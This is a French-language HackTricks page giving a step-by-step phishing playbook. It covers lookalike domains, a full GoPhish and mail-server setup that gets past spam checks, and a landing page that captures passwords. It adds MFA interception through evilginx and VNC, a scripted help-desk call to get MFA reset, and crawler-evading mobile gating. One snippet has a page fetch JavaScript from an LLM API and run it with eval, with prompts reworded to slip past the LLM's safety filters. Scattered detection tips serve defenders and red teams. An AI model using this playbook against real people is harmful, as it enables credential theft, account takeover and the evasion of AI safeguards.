# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie de Phishing

1. Recon the victim
1. Sélectionnez le **victim domain**.
2. Effectuez une énumération web basique **en recherchant des login portals** utilisés par la victime et **décidez** lequel vous allez **impersonate**.
3. Utilisez de l'**OSINT** pour **trouver des emails**.
2. Préparez l'environnement
1. **Achetez le domain** que vous allez utiliser pour l'évaluation de phishing
2. **Configurez les enregistrements** du service email (SPF, DMARC, DKIM, rDNS)
3. Configurez le VPS avec **gophish**
3. Préparez la campagne
1. Préparez le **email template**
2. Préparez la **web page** pour voler les credentials
4. Lancez la campagne !

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword** : Le nom de domaine **contient** un **mot-clé** important du domaine original (ex. zelster.com-management.com).
- **hypened subdomain** : Remplacez le **point par un tiret** dans un sous-domaine (ex. www-zelster.com).
- **New TLD** : Même domaine avec un **nouveau TLD** (ex. zelster.org)
- **Homoglyph** : Il **remplace** une lettre du nom de domaine par des **lettres qui se ressemblent** (ex. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition :** Il **inverse deux lettres** dans le nom de domaine (ex. zelsetr.com).
- **Singularization/Pluralization** : Ajoute ou enlève un “s” à la fin du nom de domaine (ex. zeltsers.com).
- **Omission** : Il **supprime une** des lettres du nom de domaine (ex. zelser.com).
- **Repetition :** Il **répète une** des lettres du nom de domaine (ex. zeltsser.com).
- **Replacement** : Comme homoglyph mais moins discret. Il remplace une des lettres du nom de domaine, peut-être par une lettre proche du clavier (ex. zektser.com).
- **Subdomained** : Introduit un **point** à l'intérieur du nom de domaine (ex. ze.lster.com).
- **Insertion** : Il **insère une lettre** dans le nom de domaine (ex. zerltser.com).
- **Missing dot** : Ajoute directement le TLD au nom de domaine. (ex. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Il existe une **possibilité qu'un ou plusieurs bits stockés ou en communication se retournent automatiquement** à cause de divers facteurs comme les éruptions solaires, les rayons cosmiques ou des erreurs matérielles.

Quand ce concept est **appliqué aux requêtes DNS**, il est possible que le **domaine reçu par le serveur DNS** ne soit pas le même que celui demandé initialement.

Par exemple, une modification d'un seul bit dans le domaine "windows.com" peut le transformer en "windnws.com."

Les attaquants peuvent **profiter de cela en enregistrant plusieurs domaines bit-flipping** similaires au domaine de la victime. Leur intention est de rediriger des utilisateurs légitimes vers leur propre infrastructure.

Pour plus d'informations lire [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Vous pouvez rechercher sur [https://www.expireddomains.net/](https://www.expireddomains.net) un domaine expiré que vous pourriez utiliser.\
Pour vous assurer que le domaine expiré que vous allez acheter **a déjà un bon SEO** vous pouvez vérifier comment il est catégorisé dans :

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Pour **découvrir davantage** d'adresses email valides ou **vérifier celles** que vous avez déjà trouvées, vous pouvez tenter un bruteforce sur les serveurs SMTP de la victime. [Apprenez comment vérifier/découvrir des adresses email ici](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
De plus, n'oubliez pas que si les utilisateurs utilisent **un portail web pour accéder à leurs mails**, vous pouvez vérifier si celui-ci est vulnérable à du **username brute force**, et exploiter la vulnérabilité si possible.

## Configuring GoPhish

### Installation

Vous pouvez le télécharger depuis [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Téléchargez et décompressez-le dans `/opt/gophish` puis exécutez `/opt/gophish/gophish`\
Un mot de passe pour l'utilisateur admin vous sera fourni pour le port 3333 dans la sortie. Par conséquent, accédez à ce port et utilisez ces identifiants pour changer le mot de passe admin. Il se peut que vous deviez tunneliser ce port vers votre machine locale :
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Configuration du certificat TLS**

Avant cette étape, vous devriez **déjà avoir acheté le domaine** que vous allez utiliser et il doit **pointer** vers **l'IP du VPS** où vous configurez **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuration de la messagerie**

Commencez l'installation : `apt-get install postfix`

Ajoutez ensuite le domaine aux fichiers suivants :

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifiez également les valeurs des variables suivantes dans /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Enfin, modifiez les fichiers **`/etc/hostname`** et **`/etc/mailname`** pour y mettre votre nom de domaine et **redémarrez votre VPS.**

Créez maintenant un **enregistrement DNS A** pour `mail.<domain>` pointant vers l'**adresse IP** du VPS et un **enregistrement DNS MX** pointant vers `mail.<domain>`

Testons maintenant l'envoi d'un e-mail :
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuration de Gophish**

Arrêtez l'exécution de gophish et configurons-le.\
Modifiez `/opt/gophish/config.json` comme suit (notez l'utilisation de https) :
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurer le service gophish**

Pour créer le service gophish afin qu'il puisse démarrer automatiquement et être géré comme un service, vous pouvez créer le fichier `/etc/init.d/gophish` avec le contenu suivant :
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Terminer la configuration du service et vérifier son fonctionnement :
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configuration du serveur mail et du domaine

### Attendre et paraître légitime

Plus un domaine est ancien, moins il est probable qu'il soit pris pour du spam. Vous devriez donc attendre autant que possible (au moins 1 semaine) avant l'évaluation phishing. De plus, si vous mettez une page concernant un secteur ayant une bonne réputation, la réputation obtenue sera meilleure.

Notez que même si vous devez attendre une semaine, vous pouvez terminer la configuration dès maintenant.

### Configurer l'enregistrement Reverse DNS (rDNS)

Mettez en place un enregistrement rDNS (PTR) qui résout l'adresse IP du VPS vers le nom de domaine.

### Enregistrement Sender Policy Framework (SPF)

Vous devez **configurer un enregistrement SPF pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement SPF [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Vous pouvez utiliser [https://www.spfwizard.net/](https://www.spfwizard.net) pour générer votre politique SPF (utilisez l'IP de la machine VPS)

![](<../../images/image (1037).png>)

Ceci est le contenu qui doit être placé dans un enregistrement TXT du domaine :
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Enregistrement DMARC (Domain-based Message Authentication, Reporting & Conformance)

Vous devez **configurer un enregistrement DMARC pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement DMARC [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Vous devez créer un nouvel enregistrement DNS TXT pointant le nom d'hôte `_dmarc.<domain>` avec le contenu suivant :
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Vous devez **configurer un DKIM pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement DMARC [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Vous devez concaténer les deux valeurs B64 que la clé DKIM génère :
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

Vous pouvez le faire en utilisant [https://www.mail-tester.com/](https://www.mail-tester.com). Il suffit d'accéder à la page et d'envoyer un e-mail à l'adresse qu'ils vous fournissent :
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Vous pouvez aussi **vérifier la configuration de votre e-mail** en envoyant un e-mail à `check-auth@verifier.port25.com` et en **lisant la réponse** (pour cela vous devrez **ouvrir** le port **25** et regarder la réponse dans le fichier _/var/mail/root_ si vous envoyez l'e-mail en tant que root).\
Vérifiez que vous passez tous les tests:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Vous pouvez aussi envoyer **un message à une adresse Gmail sous votre contrôle**, et vérifier les **en-têtes de l'email** dans votre boîte de réception Gmail, `dkim=pass` doit être présent dans le champ d'en-tête `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Retrait de la Spamhouse Blacklist

La page [www.mail-tester.com](https://www.mail-tester.com) peut indiquer si votre domaine est bloqué par Spamhouse. Vous pouvez demander la suppression de votre domaine/IP sur : ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Retrait de la Microsoft Blacklist

​​Vous pouvez demander la suppression de votre domaine/IP sur [https://sender.office.com/](https://sender.office.com).

## Créer & Lancer une campagne GoPhish

### Profil d'envoi

- Définissez un **nom pour identifier** le profil d'expéditeur
- Décidez depuis quel compte vous allez envoyer les emails de phishing. Suggestions : _noreply, support, servicedesk, salesforce..._
- Vous pouvez laisser vides le username et le password, mais assurez-vous de cocher Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Il est recommandé d'utiliser la fonctionnalité "**Send Test Email**" pour vérifier que tout fonctionne.\
> Je recommande d'**envoyer les emails de test vers des adresses 10min mails** afin d'éviter d'être blacklisté lors des tests.

### Modèle d'email

- Définissez un **nom pour identifier** le modèle
- Ensuite écrivez un **sujet** (rien d'étrange, juste quelque chose que l'on pourrait s'attendre à lire dans un email ordinaire)
- Assurez-vous d'avoir coché "**Add Tracking Image**"
- Rédigez le **modèle d'email** (vous pouvez utiliser des variables comme dans l'exemple suivant) :
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Notez que **pour augmenter la crédibilité de l'email**, il est recommandé d'utiliser une signature provenant d'un email du client. Suggestions :

- Envoyer un email à une **adresse inexistante** et vérifier si la réponse contient une signature.
- Chercher des **emails publics** comme info@ex.com ou press@ex.com ou public@ex.com et leur envoyer un email puis attendre la réponse.
- Essayer de contacter **un email valide découvert** et attendre la réponse

![](<../../images/image (80).png>)

> [!TIP]
> Le Email Template permet également de **joindre des fichiers à envoyer**. Si vous souhaitez aussi voler des challenges NTLM en utilisant des fichiers/documents spécialement conçus, [lisez cette page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Renseigner un **nom**
- **Écrire le code HTML** de la page web. Notez que vous pouvez **importer** des pages web.
- Cocher **Capture Submitted Data** et **Capture Passwords**
- Définir une **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Habituellement, vous devrez modifier le code HTML de la page et effectuer des tests en local (peut-être en utilisant un serveur Apache) **jusqu'à obtenir le résultat souhaité.** Ensuite, collez ce code HTML dans la zone.\
> Notez que si vous avez besoin d'**utiliser des ressources statiques** pour le HTML (par exemple des pages CSS ou JS), vous pouvez les enregistrer dans _**/opt/gophish/static/endpoint**_ puis y accéder depuis _**/static/\<filename>**_

> [!TIP]
> Pour la redirection vous pouvez **rediriger les utilisateurs vers la page principale légitime** de la victime, ou les rediriger vers _/static/migration.html_ par exemple, afficher une **roue de chargement** ([https://loading.io/](https://loading.io)) pendant 5 secondes puis indiquer que le processus a réussi.

### Users & Groups

- Indiquer un nom
- **Importer les données** (notez que pour utiliser le template dans l'exemple vous avez besoin du firstname, last name et de l'adresse email de chaque utilisateur)

![](<../../images/image (163).png>)

### Campaign

Enfin, créez une campagne en sélectionnant un nom, l'Email Template, la Landing Page, l'URL, le Sending Profile et le groupe. Notez que l'URL sera le lien envoyé aux victimes

Notez que le **Sending Profile permet d'envoyer un email de test pour voir à quoi ressemblera l'email de phishing final** :

![](<../../images/image (192).png>)

> [!TIP]
> Je recommande d'**envoyer les emails de test à des adresses 10min mail** afin d'éviter d'être mis sur liste noire lors des tests.

Une fois que tout est prêt, lancez simplement la campagne !

## Clonage de site web

Si pour une raison quelconque vous voulez cloner le site web, consultez la page suivante :


{{#ref}}
clone-a-website.md
{{#endref}}

## Documents & fichiers backdoorés

Dans certaines évaluations de phishing (principalement pour les Red Teams), vous souhaiterez également **envoyer des fichiers contenant une sorte de backdoor** (peut-être un C2 ou simplement quelque chose qui déclenchera une authentification).\
Consultez la page suivante pour des exemples :


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attaque précédente est assez ingénieuse car vous falsifiez un site réel et collectez les informations saisies par l'utilisateur. Malheureusement, si l'utilisateur n'a pas saisi le mot de passe correct ou si l'application que vous avez falsifiée est configurée avec 2FA, **ces informations ne vous permettront pas d'usurper l'utilisateur piégé**.

C'est là que des outils comme [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) et [**muraena**](https://github.com/muraenateam/muraena) sont utiles. Cet outil vous permettra de générer une attaque de type MitM. Fondamentalement, l'attaque fonctionne de la manière suivante :

1. Vous **usurpez le formulaire de connexion** de la page web réelle.
2. L'utilisateur **envoie** ses **credentials** à votre page factice et l'outil les transfère vers la page réelle, **vérifiant si les credentials fonctionnent**.
3. Si le compte est configuré avec **2FA**, la page MitM la demandera et une fois que **l'utilisateur la saisit**, l'outil la transmettra à la page web réelle.
4. Une fois l'utilisateur authentifié, vous (en tant qu'attaquant) aurez **capturé les credentials, le 2FA, le cookie et toute information** de chaque interaction pendant que l'outil réalise le MitM.

### Via VNC

Et si, au lieu de **rediriger la victime vers une page malveillante** ressemblant à l'originale, vous la dirigiez vers une **session VNC avec un navigateur connecté à la page web réelle** ? Vous pourrez voir ses actions, voler le mot de passe, le MFA utilisé, les cookies...\
Vous pouvez faire cela avec [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Détecter que vous avez été découvert

Évidemment, l'une des meilleures façons de savoir si vous avez été repéré est de **vérifier si votre domaine figure dans des blacklists**. S'il apparaît listé, votre domaine a d'une manière ou d'une autre été détecté comme suspect.\
Une façon simple de vérifier si votre domaine apparaît dans une blacklist est d'utiliser [https://malwareworld.com/](https://malwareworld.com)

Cependant, il existe d'autres moyens de savoir si la victime **cherche activement des activités de phishing suspectes dans la nature**, comme expliqué dans :


{{#ref}}
detecting-phising.md
{{#endref}}

Vous pouvez **acheter un domaine ayant un nom très similaire** au domaine de la victime **et/ou générer un certificat** pour un **sous-domaine** d'un domaine que vous contrôlez **contenant** le **mot-clé** du domaine de la victime. Si la **victime** effectue une quelconque interaction **DNS ou HTTP** avec eux, vous saurez qu'**elle cherche activement** des domaines suspects et vous devrez être très discret.

### Évaluer le phishing

Utilisez [**Phishious** ](https://github.com/Rices/Phishious) pour évaluer si votre email finira dans le dossier spam, sera bloqué ou réussira.

## Compromis d'identité à haute interaction (réinitialisation MFA via help-desk)

Les jeux d'intrusion modernes évitent de plus en plus les leurres par email et **ciblent directement le service-desk / le workflow de récupération d'identité** pour contourner le MFA. L'attaque est entièrement "living-off-the-land" : une fois que l'opérateur possède des credentials valides, il pivote avec des outils d'administration intégrés – aucun malware n'est nécessaire.

### Flux d'attaque
1. Recon de la victime
* Collecter des détails personnels & corporatifs depuis LinkedIn, data breaches, GitHub public, etc.
* Identifier les identités à haute valeur (dirigeants, IT, finance) et énumérer le **processus exact du help-desk** pour la réinitialisation du mot de passe / MFA.
2. Social engineering en temps réel
* Appeler par téléphone, Teams ou chatter avec le help-desk en se faisant passer pour la cible (souvent avec **un appelant spoofé** ou une **voix clonée**).
* Fournir les PII collectées précédemment pour passer la vérification basée sur les connaissances.
* Convaincre l'agent de **réinitialiser le secret MFA** ou d'effectuer un **SIM-swap** sur un numéro mobile enregistré.
3. Actions post-accès immédiates (≤60 min dans des cas réels)
* Établir une base via un portail SSO web.
* Énumérer AD / AzureAD avec les outils intégrés (aucun binaire déployé):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Mouvement latéral avec **WMI**, **PsExec**, ou des agents **RMM** légitimes déjà sur liste blanche dans l'environnement.

### Détection & atténuation
* Traiter la récupération d'identité par le help-desk comme une **opération privilégiée** – exiger une authentification renforcée & l'approbation du manager.
* Déployer des règles **Identity Threat Detection & Response (ITDR)** / **UEBA** qui alertent sur :
  * Changement de méthode MFA + authentification depuis un nouvel appareil / géo.
  * Élèvement immédiat du même principal (user→admin).
* Enregistrer les appels au help-desk et exiger un **rappel vers un numéro déjà enregistré** avant toute réinitialisation.
* Mettre en place **Just-In-Time (JIT) / Privileged Access** afin que les comptes nouvellement réinitialisés **n'héritent pas** automatiquement de tokens à haut privilège.

---

## Tromperie à grande échelle – SEO Poisoning & “ClickFix” Campaigns
Les groupes à grande échelle compensent le coût des opérations à forte interaction par des attaques massives qui transforment **les moteurs de recherche & les réseaux publicitaires en canal de distribution**.

1. **SEO poisoning / malvertising** pousse un résultat fake tel que `chromium-update[.]site` en tête des annonces de recherche.
2. La victime télécharge un petit **first-stage loader** (souvent JS/HTA/ISO). Exemples observés par Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Le loader exfiltre les cookies du navigateur + les credential DBs, puis récupère un **silent loader** qui décide – *en temps réel* – s'il faut déployer :
* RAT (ex. AsyncRAT, RustDesk)
* ransomware / wiper
* composant de persistence (clé Run du registre + tâche planifiée)

### Conseils de durcissement
* Bloquer les domaines nouvellement enregistrés & appliquer **Advanced DNS / URL Filtering** sur les *search-ads* ainsi que les e-mails.
* Restreindre l'installation de logiciel aux packages MSI signés / Store, interdire l'exécution de `HTA`, `ISO`, `VBS` par politique.
* Surveiller les processus enfants des navigateurs lançant des installateurs:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Rechercher les LOLBins fréquemment abusés par les first-stage loaders (ex. `regsvr32`, `curl`, `mshta`).

---

## Opérations de phishing améliorées par l'IA
Les attaquants enchaînent désormais des **LLM & APIs de clonage vocal** pour des leurres entièrement personnalisés et des interactions en temps réel.

| Couche | Exemple d'utilisation par un acteur de menace |
|-------|-----------------------------|
|Automatisation|Générer & envoyer >100 k emails / SMS avec des formulations randomisées & liens de tracking.|
|IA générative|Produire *one-off* emails faisant référence à des M&A publiques, des blagues internes issues des réseaux sociaux; voix deepfake du CEO dans une arnaque de rappel.|
|IA agentique|Enregistrer des domaines de façon autonome, scraper de l'OSINT, rédiger les emails de l'étape suivante quand une victime clique mais ne soumet pas ses creds.|

**Défense:**
• Ajouter **des bannières dynamiques** mettant en évidence les messages envoyés par de l'automatisation non fiable (via anomalies ARC/DKIM).  
• Déployer **des phrases de challenge biométriques vocales** pour les demandes téléphoniques à haut risque.  
• Simuler en continu des leurres générés par l'IA dans les programmes de sensibilisation – les templates statiques sont obsolètes.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblage à l'exécution assisté par LLM de JavaScript de phishing (in-browser codegen)

Les attaquants peuvent livrer du HTML inoffensif et **générer le stealer à l'exécution** en demandant à une **API LLM de confiance** du JavaScript, puis l'exécuter dans le navigateur (ex. `eval` ou `<script>` dynamique).

1. **Prompt-as-obfuscation :** encoder les URLs d'exfil / chaînes Base64 dans le prompt ; itérer le libellé pour contourner les filtres de sécurité et réduire les hallucinations.
2. **Appel API côté client :** au chargement, le JS appelle un LLM public (Gemini/DeepSeek/etc.) ou un proxy CDN ; seul le prompt/l'appel API est présent dans le HTML statique.
3. **Assembler & exécuter :** concaténer la réponse et l'exécuter (polymorphe par visite):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** le code généré personnalise le leurre (p. ex., LogoKit token parsing) et poste les creds vers le prompt-hidden endpoint.

**Evasion traits**
- Le trafic atteint des domaines LLM bien connus ou des proxies CDN réputés ; parfois via WebSockets vers un backend.
- Aucun payload statique ; le JS malveillant n'existe qu'après le render.
- Des générations non déterministes produisent des stealers **uniques** par session.

**Detection ideas**
- Exécutez des sandboxes avec JS activé ; signalez **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Cherchez des POSTs front-end vers des APIs LLM immédiatement suivis par `eval`/`Function` sur le texte retourné.
- Alertez sur des domaines LLM non autorisés dans le trafic client ainsi que des POSTs de credentials subséquents.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Outre le push-bombing classique, les opérateurs forcent simplement une **force a new MFA registration** pendant l'appel au help-desk, annulant le token existant de l'utilisateur. Toute invite de connexion ultérieure paraît légitime pour la victime.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Surveiller les événements AzureAD/AWS/Okta où **`deleteMFA` + `addMFA`** se produisent **à quelques minutes d'intervalle depuis la même IP**.



## Clipboard Hijacking / Pastejacking

Les attaquants peuvent copier silencieusement des commandes malveillantes dans le presse‑papiers de la victime depuis une page web compromise ou typosquatted, puis tromper l'utilisateur pour qu'il les colle dans **Win + R**, **Win + X** ou une fenêtre de terminal, exécutant du code arbitraire sans aucun téléchargement ni pièce jointe.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Les opérateurs restreignent de plus en plus leurs flux de phishing derrière une simple vérification de l'appareil afin que les desktop crawlers n'atteignent jamais les pages finales. Un schéma courant est un petit script qui teste si le DOM est compatible tactile et poste le résultat à un server endpoint ; les clients non‑mobiles reçoivent HTTP 500 (ou une page blanche), tandis que les utilisateurs mobiles reçoivent le flux complet.

Extrait client minimal (logique typique) :
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logique (simplifiée) :
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportement du serveur souvent observé :
- Définit un cookie de session lors du premier chargement.
- Accepte `POST /detect {"is_mobile":true|false}`.
- Retourne 500 (ou un contenu de substitution) aux requêtes GET suivantes lorsque `is_mobile=false` ; ne sert le phishing que si `true`.

Heuristiques de chasse et de détection :
- Requête urlscan : `filename:"detect_device.js" AND page.status:500`
- Télémétrie Web : séquence `GET /static/detect_device.js` → `POST /detect` → HTTP 500 pour non‑mobile ; les parcours légitimes des victimes mobiles renvoient 200 avec HTML/JS de suivi.
- Bloquer ou analyser attentivement les pages qui conditionnent le contenu exclusivement sur `ontouchstart` ou des vérifications de périphérique similaires.

Conseils de défense :
- Exécuter des crawlers avec des empreintes de type mobile et JS activé pour révéler le contenu restreint.
- Alerter sur les réponses 500 suspectes suivant `POST /detect` sur des domaines nouvellement enregistrés.

## Références

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
